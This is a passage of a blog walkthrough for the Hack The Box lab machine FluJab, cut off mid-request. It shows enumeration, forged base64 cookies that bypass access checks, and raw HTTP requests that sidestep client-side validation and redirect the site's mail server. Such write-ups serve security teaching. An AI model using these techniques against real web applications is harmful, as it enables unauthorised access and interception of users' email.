<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Hack The Box - FluJab - 0xRick’s Blog</title>
<meta name="description" content="My write-up / walkthrough for FluJab from Hack The Box.">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Hack The Box - FluJab">
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/flujab/">


  <meta property="og:description" content="My write-up / walkthrough for FluJab from Hack The Box.">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Hack The Box - FluJab">
  <meta name="twitter:description" content="My write-up / walkthrough for FluJab from Hack The Box.">
  <meta name="twitter:url" content="https://0xrick.github.io/hack-the-box/flujab/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2019-06-15T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/hack-the-box/flujab/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box - FluJab">
    <meta itemprop="description" content="Hack The Box - FluJab">
    <meta itemprop="datePublished" content="2019-06-15T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/hack-the-box/flujab/" class="u-url" itemprop="url">Hack The Box - FluJab
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2019-06-15T07:00:00+02:00">June 15, 2019</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          16 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#hack-the-box---flujab">Hack The Box - FluJab</a><ul>
<li><a href="#quick-summary">Quick Summary</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#http">HTTP</a></li>
<li><a href="#sqli">SQLi</a></li>
<li><a href="#cve-2008-0166-user-flag">CVE-2008-0166, User Flag</a></li>
<li><a href="#bypassing-restricted-bash-local-privilege-escalation-vulnerability-in-screen-root-flag">Bypassing restricted bash, Local Privilege Escalation Vulnerability in screen, Root Flag</a></li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="hack-the-box---flujab">Hack The Box - FluJab</h1>

<h2 id="quick-summary">Quick Summary</h2>
<p>Hey guys today FluJab retired and here’s my write-up about it. This machine had a lot of rabbit holes and trolls which made it hard to enjoy the machine. But without mentioning those annoying things this machine had some really cool web exploitation parts like cookie manipulation, authentication bypasses and most importantly an interesting <code class="language-plaintext highlighter-rouge">SQL</code> injection vulnerability. <code class="language-plaintext highlighter-rouge">Ajenti</code> administration panel was installed on the box and I could get credentials for it by exploiting the <code class="language-plaintext highlighter-rouge">SQLi</code>,  After that I could use a user’s public ssh key to get the private key as it was vulnerable to <code class="language-plaintext highlighter-rouge">CVE-2008-0166</code> then I escaped <code class="language-plaintext highlighter-rouge">rbash</code> and exploited a vulnerable version of <code class="language-plaintext highlighter-rouge">screen</code> to get a root shell. It’s a Linux box and its ip is <code class="language-plaintext highlighter-rouge">10.10.10.124</code>, I added it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> as <code class="language-plaintext highlighter-rouge">flujab.htb</code>. Let’s jump right in !
<br><img src="/images/hackthebox/flujab/0.png" alt="" class="align-center"><br><br></p>

<h2 id="nmap">Nmap</h2>
<p>As always we will start with <code class="language-plaintext highlighter-rouge">nmap</code> to scan for open ports and services :
<code class="language-plaintext highlighter-rouge">nmap -sV -sT -sC flujab.htb</code>
<br><img src="/images/hackthebox/flujab/1.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/flujab/2.png" alt="" class="align-center"><br><br>
We got <code class="language-plaintext highlighter-rouge">ssh</code> on port 22, <code class="language-plaintext highlighter-rouge">http</code> on ports 80 and 8080 and <code class="language-plaintext highlighter-rouge">https</code> on port 443. There’s also some sort of virtual hosting as we can see from the <code class="language-plaintext highlighter-rouge">nmap</code> scan and there are a lot of domains …<br>
We can also check the <code class="language-plaintext highlighter-rouge">ssl</code> certificate manually :
<br><img src="/images/hackthebox/flujab/3.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/flujab/4.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/flujab/5.png" alt="" class="align-center"><br><br></p>

<h2 id="http">HTTP</h2>
<p>I added all of them to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> and checked them, However I will skip the rabbit holes in the write-up because it’s just a waste of time. If we take a look at what we have :
<br><img src="/images/hackthebox/flujab/6.png" alt="" class="align-center"><br><br>
The machine name is <code class="language-plaintext highlighter-rouge">flujab</code> so we are only interested in :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>console.flujab.htb
sys.flujab.htb
smtp.flujab.htb
freeflujab.htb
flujab.htb
</code></pre></div></div>
<p>We saw that error about direct ip access when we visited <code class="language-plaintext highlighter-rouge">flujab.htb</code>, Let’s check the other 4.<br>
<code class="language-plaintext highlighter-rouge">console.flujab.htb</code> :
<br><img src="/images/hackthebox/flujab/7.png" alt="" class="align-center"><br><br>
Just a troll !
<code class="language-plaintext highlighter-rouge">sys.flujab.htb</code> :
<br><img src="/images/hackthebox/flujab/8.png" alt="" class="align-center"><br><br>
The same error on <code class="language-plaintext highlighter-rouge">flujab.htb</code>
<code class="language-plaintext highlighter-rouge">smtp.flujab.htb</code> :
<br><img src="/images/hackthebox/flujab/9.png" alt="" class="align-center"><br><br>
We don’t have any credentials for that.<br>
<code class="language-plaintext highlighter-rouge">freeflujab.htb</code> : 
<br><img src="/images/hackthebox/flujab/10.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/flujab/11.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/flujab/12.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/flujab/13.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/flujab/14.png" alt="" class="align-center"><br><br>
That one is interesting. I tried to run <code class="language-plaintext highlighter-rouge">gobuster</code> but there was a wildcard response. When I checked manually I found that instead of responding with <code class="language-plaintext highlighter-rouge">404</code> it responds with a redirection to <code class="language-plaintext highlighter-rouge">https://clownware.htb/cwerror_pages.php</code> which has a <code class="language-plaintext highlighter-rouge">gif</code> of a strange creepy clown …<br>
Note : I checked them all on port 8080 too but I always got the direct ip access error.<br>
I started <code class="language-plaintext highlighter-rouge">burp</code> and configured the scope :
<br><img src="/images/hackthebox/flujab/15.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/flujab/16.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/flujab/17.png" alt="" class="align-center"><br><br>
Then I ran the spider :
<br><img src="/images/hackthebox/flujab/18.png" alt="" class="align-center"><br><br>
Results :
<br><img src="/images/hackthebox/flujab/19.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/flujab/20.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/flujab/21.png" alt="" class="align-center"><br><br>
I checked the requests and the responses of different pages and actions. I noticed in one of the responses a <code class="language-plaintext highlighter-rouge">Set-Cookie</code> header that sets a cookie called <code class="language-plaintext highlighter-rouge">Modus</code> and sets the path for it to <code class="language-plaintext highlighter-rouge">/?smtp_config</code>.<br>
<br><img src="/images/hackthebox/flujab/22.png" alt="" class="align-center"><br><br>
I requested <code class="language-plaintext highlighter-rouge">/?smtp_config</code> in the browser and looked at the request in <code class="language-plaintext highlighter-rouge">burp</code> :
<br>Request :
<br><img src="/images/hackthebox/flujab/23.png" alt="" class="align-center"><br><br>
Response :
<br><img src="/images/hackthebox/flujab/24.png" alt="" class="align-center"><br><br>
The response was a redirection to <code class="language-plaintext highlighter-rouge">/?denied</code>. We are sending 3 cookies in every request : <code class="language-plaintext highlighter-rouge">Modus</code> , <code class="language-plaintext highlighter-rouge">Patient</code> and <code class="language-plaintext highlighter-rouge">Registered</code>. <code class="language-plaintext highlighter-rouge">Modus</code> and <code class="language-plaintext highlighter-rouge">Registered</code> are <code class="language-plaintext highlighter-rouge">base-64</code> encoded strings while <code class="language-plaintext highlighter-rouge">Patient</code> is an <code class="language-plaintext highlighter-rouge">md5</code> hash.<br>
<br><img src="/images/hackthebox/flujab/25.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">Modus</code> = <code class="language-plaintext highlighter-rouge">Configure=Null</code>
<code class="language-plaintext highlighter-rouge">Registered</code>  = <code class="language-plaintext highlighter-rouge">f991b5fb6a2939471c7230b2db78225e=Null</code>
<code class="language-plaintext highlighter-rouge">Registered</code> is using the same hash from <code class="language-plaintext highlighter-rouge">Patient</code>, After some guesses I found that this hash is for my ip :
<br><img src="/images/hackthebox/flujab/26.png" alt="" class="align-center"><br><br>
Anyway we can try to change these values from <code class="language-plaintext highlighter-rouge">Null</code> to <code class="language-plaintext highlighter-rouge">True</code> and see what happens :
<br><img src="/images/hackthebox/flujab/27.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/flujab/28.png" alt="" class="align-center"><br><br>
Request :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/?smtp_config</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">freeflujab.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
</code></pre></div></div>
<p>Response :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 15 Jun 2019 10:34:17 GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">ClownWare Proxy</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">3735</span>
</code></pre></div></div>
<p>Great, we can access the page now.<br>
<br><img src="/images/hackthebox/flujab/31.png" alt="" class="align-center"><br><br>
Before doing anything I noticed this message about the whitelist:
<br><img src="/images/hackthebox/flujab/32.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/flujab/33.png" alt="" class="align-center"><br><br>
I requested <code class="language-plaintext highlighter-rouge">/?whitelist</code> and looked at the response :
<br><img src="/images/hackthebox/flujab/34.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/flujab/35.png" alt="" class="align-center"><br><br>
My ip wasn’t there. Anyway I used python to run a debugging <code class="language-plaintext highlighter-rouge">smtp</code> server :
<code class="language-plaintext highlighter-rouge">python -m smtpd -n -c DebuggingServer 10.10.xx.xx:25</code>
<br><img src="/images/hackthebox/flujab/36.png" alt="" class="align-center"><br><br>
Then I went to update the <code class="language-plaintext highlighter-rouge">smtp</code> settings and add mine :
<br><img src="/images/hackthebox/flujab/37.png" alt="" class="align-center"><br><br>
But I got this message : <code class="language-plaintext highlighter-rouge">A Valid SMTP Domain Address Is Required</code>. So I checked the source of the form :</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">action=</span><span class="s">"?smtp_config"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row aln-center"</span><span class="nt">&gt;</span>
		<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-6 "</span><span class="nt">&gt;</span>
				<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"mailserver"</span> <span class="na">id=</span><span class="s">"email-server"</span> <span class="na">value=</span><span class="s">"smtp.flujab.htb"</span> <span class="na">pattern=</span><span class="s">"smtp.[A-Za-z]{1,255}.[A-Za-z]{2,5}"</span> <span class="na">title=</span><span class="s">" A Valid SMTP Domain Address Is Required"</span><span class="nt">/&gt;</span>
				<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"port"</span> <span class="na">id=</span><span class="s">"port"</span> <span class="na">placeholder=</span><span class="s">"25"</span> <span class="na">value=</span><span class="s">"25"</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;/div&gt;</span>
		<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-12"</span><span class="nt">&gt;</span>
		<span class="nt">&lt;p&gt;</span>
			WARNING: Only <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/?whitelist"</span><span class="nt">&gt;</span>whitelisted sysadmins<span class="nt">&lt;/a&gt;</span> are authorized to 
			access this page! <span class="nt">&lt;br</span> <span class="err">\</span><span class="nt">&gt;</span> If you are not supposed to 
			change these settings then don't! whitelist will be 
			auto-updated.
		<span class="nt">&lt;/p&gt;</span>
			<span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"actions"</span><span class="nt">&gt;</span>
				<span class="nt">&lt;li&gt;&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">class=</span><span class="s">"style1"</span> <span class="na">value=</span><span class="s">"Save Mail Server Config"</span> <span class="na">name=</span><span class="s">"save"</span> <span class="nt">/&gt;&lt;/li&gt;</span>
			<span class="nt">&lt;/ul&gt;</span>
		<span class="nt">&lt;/div&gt;</span>
	<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/form&gt;</span>
</code></pre></div></div>
<p>It’s relying on client-side validation check : 
<br><img src="/images/hackthebox/flujab/39.png" alt="" class="align-center"><br><br>
Which means that we can bypass it easily by sending the data directly in the request :
<br>Request :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/?smtp_config</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">freeflujab.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">59</span>

mailserver=10.10.xx.xx&amp;port=25&amp;save=Save+Mail+Server+Config
</code></pre></div></div>
<p><br><img src="/images/hackthebox/flujab/41.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/flujab/42.png" alt="" class="align-center"><br><br>
Note : I checked <code class="language-plaintext highlighter-rouge">/?whitelist</code> again and my ip was added there after I added it in the <code class="language-plaintext highlighter-rouge">smtp</code> server configuration
In the patients section there were some pages to book an appointment (<code class="language-plaintext highlighter-rouge">/?book</code>), send a reminder (<code class="language-plaintext highlighter-rouge">/?remind</code>) or to cancel an appointment (<code class="language-plaintext highlighter-rouge">/?cancel</code>). To book an appointment we need a valid patient’s name. After some enumeration I found some names in <code class="language-plaintext highlighter-rouge">/?info</code> :
<br><img src="/images/hackthebox/flujab/43.png" alt="" class="align-center"><br><br>
I took B. Smith and after some guesses I got the right name which was Bob Smith :
<br><img src="/images/hackthebox/flujab/44.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/flujab/45.png" alt="" class="align-center"><br><br>
The email was sent and we can see that in the python <code class="language-plaintext highlighter-rouge">smtp</code> server :
<br><img src="/images/hackthebox/flujab/46.png" alt="" class="align-center"><br><br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------- MESSAGE FOLLOWS ----------                                                                                                       
Date: Thu, 13 Jun 2019 14:47:23 +0100                                                                                                       
To: bobsmith1975@gmail.com                                                                                                                  
From: Nurse Julie &lt;DutyNurse@flujab.htb&gt;
Subject: Flu Jab Appointment - Ref:NHS-943-475-5911
Message-ID: &lt;e1f9b14325c78abda96f5dd82694b7a4@freeflujab.htb&gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124



  Dear Mr Bob Smith,

  Here are the details of your appointment at our surgery.
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : NHS-943-475-5911
    Code   : Influ-022
    Type   : Injection
    Time   : 09:00
    Date   : 2018-11-30
    LOC    : Crick026
  ________________________

  We look forward to seeing you.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
</code></pre></div></div>
<p>I tried to go to <code class="language-plaintext highlighter-rouge">/?cancel</code> :
Request :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/?cancel</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">freeflujab.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
</code></pre></div></div>
<p>Response :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 13 Jun 2019 13:50:05 GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Location</span><span class="p">:</span> <span class="s">/?ERROR=NOT_REGISTERED</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">ClownWare Proxy</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">2060</span>
</code></pre></div></div>
<p>It redirected me to <code class="language-plaintext highlighter-rouge">/?ERROR=NOT_REGISTERED</code>. I looked at the older requests and I noticed the <code class="language-plaintext highlighter-rouge">Set-Cookie</code> headers :
<br><img src="/images/hackthebox/flujab/49.png" alt="" class="align-center"><br><br>
So I added the info about expiration, max age and path to my cookies and tried again :
Request :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/?cancel</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">freeflujab.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">Modus=Q29uZmlndXJlPVRydWU%3d; expires=Thu, 13-Jun-2019 14:04:38 GMT; Max-Age=3600; path=/?smtp_config; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQ%3D%3D; expires=Thu, 13-Jun-2019 14:04:38 GMT; Max-Age=3600; path=/</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
</code></pre></div></div>
<p>Response :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 13 Jun 2019 13:58:23 GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">ClownWare Proxy</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">5128</span>
</code></pre></div></div>
<p><br><img src="/images/hackthebox/flujab/52.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/flujab/53.png" alt="" class="align-center"><br><br>
To cancel an appointment we need to provide the NHS number of the patient. However like on the <code class="language-plaintext highlighter-rouge">smtp</code> configuration page it used client-side validation check :</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"nhsnum"</span> <span class="na">placeholder=</span><span class="s">"NHS Number Required"</span> <span class="na">pattern=</span><span class="s">"NHS-\d{3}-\d{3}-\d{4}"</span> <span class="na">title=</span><span class="s">" A Valid NHS Number Is Required e.g. NHS-012-345-6789"</span> <span class="na">required</span><span class="nt">&gt;&lt;/br&gt;</span>
  <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"actions"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;center&gt;&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">class=</span><span class="s">"style1"</span> <span class="na">value=</span><span class="s">"Cancel Appointment"</span> <span class="na">name=</span><span class="s">"submit"</span> <span class="nt">/&gt;&lt;/center&gt;</span>
</code></pre></div></div>
<p><br><img src="/images/hackthebox/flujab/55.png" alt="" class="align-center"><br><br>
Request :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/?cancel</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">freeflujab.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">https://freeflujab.htb/?cancel</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
